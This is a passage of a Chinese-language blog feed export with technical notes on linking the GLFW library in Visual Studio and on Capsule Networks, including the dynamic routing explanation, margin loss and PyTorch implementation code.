        <content type="html"><![CDATA[<h3><span id="static-link">Static link</span></h3><p>更快速，编译时会优化。在visual studio中需要添加header file和libfile路径。以GLFW库的使用为例</p><p><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/images//pic/C-Project使用外部库_pic/image-20200708131006645.png" srcset="/img/loading.gif" lazyload></p><p>在project文件夹下新建Dependencies文件夹，将下载的 include 和lib-vc2017 复制到文件夹下。</p><p>添加 include 下的header file</p><p><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/images//pic/C-Project使用外部库_pic/image-20200708131706674.png" srcset="/img/loading.gif" lazyload></p><p>添加lib file</p><p><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/images//pic/C-Project使用外部库_pic/image-20200708132005000.png" srcset="/img/loading.gif" lazyload></p><p>添加目标static lib file到project。文件位于lib-vc2017文件夹下。</p><p><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/images//pic/C-Project使用外部库_pic/image-20200708132324138.png" srcset="/img/loading.gif" lazyload></p><h3><span id="dynamic-link">Dynamic link</span></h3><p>lib-vc2017文件夹下，还有glfw3dll.lib，这是动态链接需要导入的libfile。即替换上图中的glfw3.lib为glfw3dll.lib。</p><p>但是需要注意，dll文件需要与可执行文件 xxx.exe位于同一个文件夹下，在程序运行时动态链接。否则会报错。</p>]]></content>
      
      
      <categories>
          
          <category> Notes </category>
          
          <category> CS </category>
          
      </categories>
      
      
        <tags>
            
            <tag> c++ </tag>
            
            <tag> library </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Capsule Net</title>
      <link href="/posts/cd141949.html"/>
      <url>/posts/cd141949.html</url>
      
        <content type="html"><![CDATA[<p>一个 capsule 是一组神经元，capsule activity vector表示特定类型的实体（例如对象或对象部分）的实例化参数。activityvector的长度来表示实体存在的概率，方向表示实例化参数。前一层capsule通过转换矩阵对下一层capsule的实例化参数进行预测。该网络相比于CNN，对于重叠的目标，识别效果更好且能分离出重叠目标。算法使用iterative routing-by-agreement mechanism，高层级的capsule的activityvector的计算过程将接收低层capsule的计算结果。</p><p>相比于CNN，Caps Net用vector-output capsules代替CNN的scalar-outputfeature detectors，并使用routing-by-agreement代替max-pooling</p><h3><span id="motivation">Motivation</span></h3><p>​人的视觉系统通常之关注图像中很小部分的重要信息，这部分信息视觉系统通过高分辨率处理，而其他不重要的信息常常就忽略掉。</p><p>​ 处理这部分重要信息的模型，文章叫做single fixation。假设singlefixation可以提取的信息不仅仅是某一个事物的特征，而是某一个类型的特征信息，并且在建模过程中忽略每一个fixation之间相互左右的规律。只要求模型解析出每一个singlefixation。</p><p>​一个capsule代表图像中一个部分的目标信息，并且文章中提到“感知拥挤“的研究，来支撑一个capsule只代表一个目标信息的合理性。</p><figure><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/images/1-CapsuleNet和动态路由.assets/image-20191110163026495.png" srcset="/img/loading.gif" lazyload alt="image"><figcaption aria-hidden="true">image</figcaption></figure><p>​capsule可以代表目标的很多信息，文章将capsule输出vector的长度约束在1以内，代表存在概率；vector的方向代表目标的特征。</p><p>​capsule的学习的信息具有一种全局的相关性。这样可以解决以下的问题。CNN倾向于局部特征的检测，整体上的空间关系对其预测结果的影响较小。实际上不是人脸的照片，在此处都检测为正确。</p><p><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/images/1-CapsuleNet和动态路由.assets/image-20191110155508014.png" srcset="/img/loading.gif" lazyload alt="image" style="zoom:50%;"></p><hr><h3><span id="vector-inputs-andoutputs-of-a-capsule">Vector inputs andoutputs of a capsule</span></h3><p>​ 根据长度代表出现概率的思路，文章提出了以下“激活函数”：</p><p><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/images/pic/1-CapsuleNet和动态路由_pic/image-20200707222128481.png" srcset="/img/loading.gif" lazyload alt="image" style="zoom:80%;"></p><p><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/images/1-CapsuleNet和动态路由.assets/1570955897796.png" srcset="/img/loading.gif" lazyload></p><figure><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/images/1-CapsuleNet和动态路由.assets/image-20191110170411374.png" srcset="/img/loading.gif" lazyload alt="image"><figcaption aria-hidden="true">image</figcaption></figure><p>​ 输出将确保short vectors长度趋于0，longvectors长度趋于1。角度代表的信息由矩阵变换和低层不同特征的向量加权求和得到。</p><p>​ u来自低层级的capsule的输出。<span class="math inline">\(c_{ij}\)</span>由iterative dynamic routingprocess计算。<span class="math inline">\(b_{ij}\)</span>首先作为log先验概率初始化，在每一步迭代中更新概率。<img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/images/1-CapsuleNet和动态路由.assets/1570956636011.png" srcset="/img/loading.gif" lazyload></p><p><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/images/pic/1-CapsuleNet和动态路由_pic/image-20200707222554055.png" srcset="/img/loading.gif" lazyload alt="image" style="zoom:80%;"></p><p>​ <span class="math inline">\(c_{ij}\)</span>相当于CNN中maxpooling干的事。感觉有点像attention，iterative attention。</p><figure><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/images/1-CapsuleNet和动态路由.assets/image-20191110164629017.png" srcset="/img/loading.gif" lazyload alt="image"><figcaption aria-hidden="true">image</figcaption></figure><figure><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/images/1-CapsuleNet和动态路由.assets/image-20191110164449384.png" srcset="/img/loading.gif" lazyload alt="image"><figcaption aria-hidden="true">image</figcaption></figure><p>​这种“routing-by-agreement”应该比通过max-pooling实现的非常原始的路由形式更加有效。后者可以使一层中的神经元忽略该层中除了最活跃的特征之外的所有特征。前者层层迭代，层层parsing，信息损失自然更少。</p><p>​ 之后，Hinton又提出了EM routing[Matrix capsules with EM routing. ICLR(2018)]。 通过计算Existenceprobability和概率分布完成不同层间的计算，简单示意图如下。<a href="https://github.com/yl-1993/Matrix-Capsules-EM-PyTorch">codereference</a></p><figure><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/images/1-CapsuleNet和动态路由.assets/image-20191110151624084.png" srcset="/img/loading.gif" lazyload alt="image"><figcaption aria-hidden="true">image</figcaption></figure><h4><span id="max-pooling-problem">max-pooling problem</span></h4><p>​ max-pooling还存在以下问题：</p><ol type="1"><li><p>甚至不能区分左和右</p></li><li><p>对rotation不敏感，不能学习到方向信息</p></li><li><p>一次只能‘看到’一个object</p></li><li><p>max-pooling只做到spatial invariance</p><figure><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/images/1-CapsuleNet和动态路由.assets/image-20191110163730310.png" srcset="/img/loading.gif" lazyload alt="image"><figcaption aria-hidden="true">image</figcaption></figure><p>而不能做到spatial equivariance</p><figure><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/images/1-CapsuleNet和动态路由.assets/image-20191110164114175.png" srcset="/img/loading.gif" lazyload alt="image"><figcaption aria-hidden="true">image</figcaption></figure><p>capsule net通过：</p><figure><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/images/1-CapsuleNet和动态路由.assets/image-20191110165736553.png" srcset="/img/loading.gif" lazyload alt="image"><figcaption aria-hidden="true">image</figcaption></figure><p>计算下一层capsule经过W变换后的u，进行组合，得到不同的结果。错误的预测route被裁剪(pruned)，模型具有一定的spatialequivariance。</p><figure><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/images/1-CapsuleNet和动态路由.assets/image-20191110170300458.png" srcset="/img/loading.gif" lazyload alt="image"><figcaption aria-hidden="true">image</figcaption></figure></li></ol><hr><h3><span id="margin-loss-for-digitexistence">Margin loss for digitexistence</span></h3><p>​分别对每个类别计算损失，同时注意只有capsule对应的部分出现某类目标，才计算损失。</p><figure><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/images/pic/1-CapsuleNet和动态路由_pic/image-20200707222308871.png" srcset="/img/loading.gif" lazyload alt="image"><figcaption aria-hidden="true">image</figcaption></figure><p>​ <span class="math inline">\(T_k\)</span>只有在classk出现的时候等于1。</p><figure><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/images/pic/1-CapsuleNet和动态路由_pic/image-20200707222324475.png" srcset="/img/loading.gif" lazyload alt="image"><figcaption aria-hidden="true">image</figcaption></figure><p>​ <span class="math inline">\(\lambda\)</span>是为了防止，限制vector长度后在训练开始阶段由于没有识别到目标导致的学习停滞问题，取0.5。总体存在性检测loss是所有类别capsule的损失之和。</p><p>​ 整体损失，还要加上capsule重构图像特征的损失。</p><figure><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/images/1-CapsuleNet和动态路由.assets/image-20191110162131283.png" srcset="/img/loading.gif" lazyload alt="image"><figcaption aria-hidden="true">image</figcaption></figure><hr><h3><span id="capsnet-architecture">CapsNet architecture</span></h3><p><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/images/1-CapsuleNet和动态路由.assets/1570958302422.png" srcset="/img/loading.gif" lazyload></p><figure><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/images/1-CapsuleNet和动态路由.assets/image-20191110160905390.png" srcset="/img/loading.gif" lazyload alt="image"><figcaption aria-hidden="true">image</figcaption></figure><figure><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/images/1-CapsuleNet和动态路由.assets/image-20191110161236308.png" srcset="/img/loading.gif" lazyload alt="image"><figcaption aria-hidden="true">image</figcaption></figure><p>​ 32个capsule，每个8维。</p><figure><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/images/1-CapsuleNet和动态路由.assets/image-20191110161436562.png" srcset="/img/loading.gif" lazyload alt="image"><figcaption aria-hidden="true">image</figcaption></figure><p>​ 转换后，每个classcapsule16维，不同而维度影响重构图像的不同特征。</p><p>​ routing-by-agreement的迭代过程就是不同的routesquash结果进行裁剪的过程，计算结果相差大的route逐渐被移除。</p><figure><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/images/1-CapsuleNet和动态路由.assets/image-20191110171656945.png" srcset="/img/loading.gif" lazyload alt="image"><figcaption aria-hidden="true">image</figcaption></figure><p>​ EM route则是计算primry结果和route squash结果分布的差异。</p><figure><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/images/1-CapsuleNet和动态路由.assets/image-20191110172223944.png" srcset="/img/loading.gif" lazyload alt="image"><figcaption aria-hidden="true">image</figcaption></figure><p>​capsule输出vector的长度约束在1以内，代表存在概率；vector的方向代表目标的特征。</p><p>​其中每个capsule的转化矩阵都是独立的不同的，每个class对应一个capsule。</p><p>​ A simple CapsNet with 3 layers.PrimaryCaps计算第一层capsules的输入， DigitCaps计算部分使用iterativedynamic routing，计算输出capsules。</p><p><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/images/1-CapsuleNet和动态路由.assets/1570958488870.png" srcset="/img/loading.gif" lazyload></p><p>​重构图像网络，采用训练好的DigitCaps，在此基础上训练重构网络，计算图像特征重构损失。只需要将truelabel的capsule提取出来进行重构计算即可。因此，多个数字重合的重构也能实现。</p><hr><h3><span id="code">Code</span></h3><p>​ 重要的网络构建代码如下，<a href="https://github.com/RacleRay/DeepLearningFoundation/tree/master/CapsNet">完整代码</a></p><p>​ Caps Net训练相对于CNN慢很多，并且只使用一层dynamicrouting，参数量也更大，batchsize相比CNN也要取得小一些，在相同条件下。</p><p>​网络收敛比较快，而且计算过程损失的变化相对稳定。下图为第一轮训练结果。</p><p><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/images/1-CapsuleNet和动态路由.assets/1570988099970.png" srcset="/img/loading.gif" lazyload></p><p>​ 第二轮计算结果</p><p><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/images/1-CapsuleNet和动态路由.assets/1570988796272.png" srcset="/img/loading.gif" lazyload></p><p>​ 相关layer定义，以下代码参考了https://github.com/XifengGuo/CapsNet-Pytorch，https://github.com/naturomics/CapsNet-Tensorflow.git。在其上修改了写网络计算过程。</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">import</span> torch<br><span class="hljs-keyword">import</span> torch.nn <span class="hljs-keyword">as</span> nn<br><span class="hljs-keyword">import</span> torch.nn.functional <span class="hljs-keyword">as</span> F<br><span class="hljs-keyword">from</span> torch.autograd <span class="hljs-keyword">import</span> Variable<br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">squash</span><span class="hljs-params">(inputs, axis=<span class="hljs-number">-1</span>)</span>:</span><br>    <span class="hljs-string">"""capsule输出的激活函数"""</span><br>    norm = torch.norm(inputs, dim=axis, keepdim=<span class="hljs-literal">True</span>)<br>    scale = norm ** <span class="hljs-number">2</span> / (<span class="hljs-number">1</span> + norm ** <span class="hljs-number">2</span>) / (norm + <span class="hljs-number">1e-8</span>)<br>    <span class="hljs-keyword">return</span> scale * inputs<br><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">PrimaryCaps</span><span class="hljs-params">(nn.Module)</span>:</span><br>    <span class="hljs-string">"""计算第一层capsules的输入，转换成32*6*6个8维的capsule vector</span><br><span class="hljs-string">    in_channels：原文中256</span><br><span class="hljs-string">    out_channels：卷积后的通道数，原文中256</span><br><span class="hljs-string">    dim_caps: PrimaryCaps输出的每个capsule的维度</span><br><span class="hljs-string">    kernel_size：原文中9 * 9</span><br><span class="hljs-string">    stride：2</span><br><span class="hljs-string">    """</span><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__init__</span><span class="hljs-params">(self, in_channels, out_channels, dim_caps, kernel_size, stride=<span class="hljs-number">1</span>, padding=<span class="hljs-number">0</span>)</span>:</span><br>        super(PrimaryCaps, self).__init__()<br>        self.dim_caps = dim_caps<br>        self.conv2d = nn.Conv2d(in_channels,<br>                                out_channels,<br>                                kernel_size=kernel_size,<br>                                stride=stride,<br>                                padding=padding)<br><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">forward</span><span class="hljs-params">(self, input)</span>:</span><br>        <span class="hljs-string">"""转换成32*6*6个8维的capsule vector, output size=[batch_size, num_caps, dim_caps]"""</span><br>        output = self.conv2d(input)<br>        output = output.view(input.size(<span class="hljs-number">0</span>), <span class="hljs-number">-1</span>, self.dim_caps)<br>        <span class="hljs-keyword">return</span> squash(output)<br><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">DenseCaps</span><span class="hljs-params">(nn.Module)</span>:</span><br>    <span class="hljs-string">"""iterative dynamic routing计算capsule目标识别结果vector。</span><br><span class="hljs-string">    input size = [None, in_num_caps, in_dim_caps]，</span><br><span class="hljs-string">    output size = [None, out_num_caps, out_dim_caps]。</span><br><span class="hljs-string"></span><br><span class="hljs-string">    in_num_caps: 第一层的输入capsule数量，32*6*6</span><br><span class="hljs-string">    in_dim_caps：第一层的输入capsule维度，8</span><br><span class="hljs-string">    out_num_caps：iterative dynamic routing时及输出的capsule数量，10</span><br><span class="hljs-string">    out_dim_caps：iterative dynamic routing时及输出的capsule维度，16</span><br><span class="hljs-string">    iterations：dynamic routing轮次</span><br><span class="hljs-string">    weight：由32*6*6个8维的capsule vector计算10个16维的capsule vector的transform matrix，在每个[6 * 6]</span><br><span class="hljs-string">            单元内的capsule是共享权重的。</span><br><span class="hljs-string">    """</span><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__init__</span><span class="hljs-params">(self, in_num_caps, in_dim_caps, out_num_caps, out_dim_caps, iterations=<span class="hljs-number">3</span>)</span>:</span><br>        super(DenseCaps, self).__init__()<br>        self.in_num_caps = in_num_caps<br>        self.in_dim_caps = in_dim_caps<br>        self.out_num_caps = out_num_caps<br>        self.out_dim_caps = out_dim_caps<br>        self.iterations = iterations<br>        self.weight = nn.Parameter(<span class="hljs-number">0.01</span> * torch.randn(<span class="hljs-number">1</span>,<br>                                                      in_num_caps,<br>                                                      out_num_caps * out_dim_caps,<br>                                                      in_dim_caps,<br>                                                      <span class="hljs-number">1</span>))<br><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">forward</span><span class="hljs-params">(self, u)</span>:</span><br>        <span class="hljs-string">"""u_hat在不同layer的capsules之间传递，每层capsules只能是才c，b在更新。文中结构只接上了一层</span><br><span class="hljs-string">        dynamic routing capsules layer。"""</span><br>        <span class="hljs-comment"># self.weight * u</span><br>        <span class="hljs-comment">#     [1    , in_num_caps, out_num_caps * out_dim_caps, in_dim_caps, 1]</span><br>        <span class="hljs-comment">#     [batch, in_num_caps, out_num_caps * out_dim_caps, in_dim_caps, 1]</span><br>        <span class="hljs-comment"># =&gt;&gt; [batch, in_num_caps, out_num_caps * out_dim_caps, in_dim_caps, 1]</span><br>        <span class="hljs-comment"># 按元素相乘，然后在reduce sum</span><br>        u_hat = u[:, :, <span class="hljs-literal">None</span>, :, <span class="hljs-literal">None</span>]<br>        u_hat = self.weight * u_hat.repeat(<span class="hljs-number">1</span>, <span class="hljs-number">1</span>, self.out_num_caps * self.out_dim_caps, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>)<br>        u_hat = torch.sum(u_hat, dim=<span class="hljs-number">3</span>)<br>        <span class="hljs-comment"># [batch, in_num_caps, out_num_caps, out_dim_caps]</span><br>        u_hat = torch.squeeze(u_hat.view(<span class="hljs-number">-1</span>,<br>                                         self.in_num_caps,<br>                                         self.out_num_caps,<br>                                         self.out_dim_caps,<br>                                         <span class="hljs-number">1</span>))<br>        u_hat_for_route = u_hat.detach()<br><br>        <span class="hljs-comment"># coupling coefficient initialize</span><br>        <span class="hljs-comment"># [batch, in_num_caps, out_num_caps]</span><br>        b = Variable(torch.zeros(u.size(<span class="hljs-number">0</span>), self.in_num_caps, self.out_num_caps)).cuda()<br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(self.iterations):<br>            c = F.softmax(b, dim=<span class="hljs-number">2</span>)  <span class="hljs-comment"># [batch, in_num_caps, out_num_caps]</span><br>            <span class="hljs-keyword">if</span> i &lt; self.iterations - <span class="hljs-number">1</span>:<br>                <span class="hljs-comment"># u   [batch, in_num_caps, out_num_caps, out_dim_caps]</span><br>                <span class="hljs-comment"># c   [batch, in_num_caps, out_num_caps, 1]</span><br>                <span class="hljs-comment"># =&gt;&gt; [batch, 1, out_num_caps, out_dim_caps]</span><br>                outputs = squash(torch.sum(torch.unsqueeze(c, <span class="hljs-number">3</span>) * u_hat_for_route, dim=<span class="hljs-number">1</span>, keepdims=<span class="hljs-literal">True</span>))<br>                b = b + torch.sum(outputs * u_hat_for_route, dim=<span class="hljs-number">-1</span>)<br>            <span class="hljs-keyword">else</span>:<br>                <span class="hljs-comment"># 此时进入bp计算</span><br>                outputs = squash(torch.sum(torch.unsqueeze(c, <span class="hljs-number">3</span>) * u_hat, dim=<span class="hljs-number">1</span>, keepdims=<span class="hljs-literal">True</span>))<br><br>        <span class="hljs-comment"># [batch, out_num_caps, out_dim_caps]</span><br>        <span class="hljs-keyword">return</span> torch.squeeze(outputs, dim=<span class="hljs-number">1</span>)<br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">caps_loss</span><span class="hljs-params">(y_true, y_pred, x, x_reconstruct, lamada)</span>:</span><br>    <span class="hljs-string">"""Capsule loss = Margin loss + lamada * reconstruction loss.</span><br><span class="hljs-string">    y shape [batch, classes], x shape [batch, channels, height, width]"""</span><br>    L = y_true * torch.clamp(<span class="hljs-number">0.9</span> - y_pred, min=<span class="hljs-number">0</span>) ** <span class="hljs-number">2</span> + \<br>        <span class="hljs-number">0.5</span> * (<span class="hljs-number">1</span> - y_true) * torch.clamp(y_pred - <span class="hljs-number">0.1</span>, min=<span class="hljs-number">0</span>) ** <span class="hljs-number">2</span><br><br>    L_margin = L.sum(dim=<span class="hljs-number">1</span>).mean()<br>    L_recon = nn.MSELoss()(x_reconstruct, x)<br><br>    <span class="hljs-keyword">return</span> L_margin + lamada * L_recon<br></code></pre></div></td></tr></table></figure><p>​ 网络定义</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">import</span> torch<br><span class="hljs-keyword">import</span> torch.nn.functional <span class="hljs-keyword">as</span> F<br><span class="hljs-keyword">from</span> torch.autograd <span class="hljs-keyword">import</span> Variable<br><span class="hljs-keyword">from</span> torch <span class="hljs-keyword">import</span> nn<br><span class="hljs-keyword">from</span> layers <span class="hljs-keyword">import</span> DenseCaps, PrimaryCaps<br><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CapsuleNet</span><span class="hljs-params">(nn.Module)</span>:</span><br>    <span class="hljs-string">"""</span><br><span class="hljs-string">    Input: (batch, channels, width, height)</span><br><span class="hljs-string">    Output:((batch, classes), (batch, channels, width, height))</span><br><span class="hljs-string"></span><br><span class="hljs-string">    input_size: [channels, width, height]</span><br><span class="hljs-string">    classes: number of classes</span><br><span class="hljs-string">    iterations：dynamic routing iterations</span><br><span class="hljs-string">    """</span><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__init__</span><span class="hljs-params">(self, input_size, classes, iterations)</span>:</span><br>        super(CapsuleNet, self).__init__()<br>        self.input_size = input_size<br>        self.classes = classes<br>        self.iterations = iterations<br><br>        <span class="hljs-comment"># Layer 1: Just a conventional Conv2D layer</span><br>        self.conv1 = nn.Conv2d(input_size[<span class="hljs-number">0</span>], <span class="hljs-number">256</span>, kernel_size=<span class="hljs-number">9</span>, stride=<span class="hljs-number">1</span>, padding=<span class="hljs-number">0</span>)<br><br>        <span class="hljs-comment"># Layer 2: Conv2D layer with `squash` activation, then reshape to [None, num_caps, dim_caps]</span><br>        self.primarycaps = PrimaryCaps(<span class="hljs-number">256</span>, <span class="hljs-number">256</span>, <span class="hljs-number">8</span>, kernel_size=<span class="hljs-number">9</span>, stride=<span class="hljs-number">2</span>, padding=<span class="hljs-number">0</span>)<br><br>        <span class="hljs-comment"># Layer 3: Capsule layer. iterative dynamic routing.</span><br>        self.digitcaps = DenseCaps(in_num_caps=<span class="hljs-number">32</span>*<span class="hljs-number">6</span>*<span class="hljs-number">6</span>, in_dim_caps=<span class="hljs-number">8</span>,<br>                                      out_num_caps=classes, out_dim_caps=<span class="hljs-number">16</span>, iterations=iterations)<br><br>        <span class="hljs-comment"># reconstruction net</span><br>        self.reconstructor = nn.Sequential(<br>            nn.Linear(<span class="hljs-number">16</span>*classes, <span class="hljs-number">512</span>),<br>            nn.ReLU(inplace=<span class="hljs-literal">True</span>),<br>            nn.Linear(<span class="hljs-number">512</span>, <span class="hljs-number">1024</span>),<br>            nn.ReLU(inplace=<span class="hljs-literal">True</span>),<br>            nn.Linear(<span class="hljs-number">1024</span>, input_size[<span class="hljs-number">0</span>] * input_size[<span class="hljs-number">1</span>] * input_size[<span class="hljs-number">2</span>]),<br>            nn.Sigmoid()<br>        )<br>        self.relu = nn.ReLU()<br><br><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">forward</span><span class="hljs-params">(self, x, y=None)</span>:</span><br>        x = self.relu(self.conv1(x))<br>        x = self.primarycaps(x)<br>        x = self.digitcaps(x)  <span class="hljs-comment"># [batch, out_num_caps, out_dim_caps]</span><br>        length = x.norm(dim=<span class="hljs-number">-1</span>)  <span class="hljs-comment"># vector lenght代表存在概率 [batch, out_num_caps, 1]</span><br><br>        <span class="hljs-keyword">if</span> y <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:  <span class="hljs-comment"># during testing, no label given. create one-hot coding using `length`</span><br>            index = length.max(dim=<span class="hljs-number">1</span>)[<span class="hljs-number">1</span>]<br>            <span class="hljs-comment"># 将index处，更改为1</span><br>            y = Variable(torch.zeros(length.size()).scatter_(<span class="hljs-number">1</span>, index.view(<span class="hljs-number">-1</span>, <span class="hljs-number">1</span>).cpu().data, <span class="hljs-number">1.</span>).cuda())<br><br>        <span class="hljs-comment"># y[:, :, None]: mask</span><br>        reconstruction = self.reconstructor((x * y[:, :, <span class="hljs-literal">None</span>]).view(x.size(<span class="hljs-number">0</span>), <span class="hljs-number">-1</span>))<br>        <span class="hljs-comment"># 存在概率预测，重构图像像素</span><br>        <span class="hljs-keyword">return</span> length, reconstruction.view(<span class="hljs-number">-1</span>, *self.input_size)<br></code></pre></div></td></tr></table></figure><hr><h3><span id="other-capsules">Other capsules</span></h3><h4><span id="text">Text</span></h4><p>​ 使用capsule nets处理文本的简单架构[Investigating capsule networkswith dynamic routing for text classification. EMNLP(2018)]，如下图所示。</p><figure><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/images/1-CapsuleNet和动态路由.assets/image-20191110152353504.png" srcset="/img/loading.gif" lazyload alt="image"><figcaption aria-hidden="true">image</figcaption></figure><h4><span id="graph">Graph</span></h4><p>​ 结合GNN的简单网络示意[Capsule Graph Neural Network. ICLR(2018)]。</p><figure><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/images/1-CapsuleNet和动态路由.assets/image-20191110152747324.png" srcset="/img/loading.gif" lazyload alt="image"><figcaption aria-hidden="true">image</figcaption></figure><h4><span id="3d-point-cloud">3D point cloud</span></h4><p>​ 3D重构[3D Point-Capsule Networks. CVPR, (2019)]</p><figure><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/images/1-CapsuleNet和动态路由.assets/image-20191110152955662.png" srcset="/img/loading.gif" lazyload alt="image"><figcaption aria-hidden="true">image</figcaption></figure><h3><span id="applications">Applications</span></h3><p>​ Relation extraction，Adversary detection，Brain tumorclassification，Classification of Breast Cancer.</p><p>​ 比如，Relation extraction方面的研究[Multi-labeled RelationExtraction with Attentive Capsule Network. AAAI (2018)]</p><figure><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/images/1-CapsuleNet和动态路由.assets/image-20191110153704495.png" srcset="/img/loading.gif" lazyload alt="image"><figcaption aria-hidden="true">image</figcaption></figure><p>​ [Attention-Based Capsule Networks with Dynamic Routing for RelationExtraction. EMNLP 2018]</p><figure><img 